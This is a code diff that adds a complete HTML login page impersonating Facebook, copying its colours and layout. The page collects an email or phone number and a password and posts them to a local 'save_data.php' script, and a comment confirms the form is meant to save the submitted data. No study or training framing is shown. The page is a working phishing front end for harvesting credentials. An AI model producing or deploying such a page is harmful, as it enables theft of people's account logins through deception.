@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Facebook - Log In</title>
+<style>
+    body { font-family: Arial, sans-serif; background-color: #f0f2f5; text-align: center; margin-top: 50px; }
+    .login-box { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); display: inline-block; }
+    input { display: block; margin: 10px 0; padding: 8px; width: 80%; }
+    button { background-color: #1877f2; color: #fff; border: none; padding: 8px 20px; cursor: pointer; border-radius: 5px; }
+</style>
+</head>
+<body>
+
+<div class="login-box">
+    <h2>Facebook</h2>
+    <!-- Form sends data to save_data.php -->
+    <form action="save_data.php" method="POST">
+        <input type="text" name="email" placeholder="Email or Phone" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+</div>
+
+</body>
+</html>
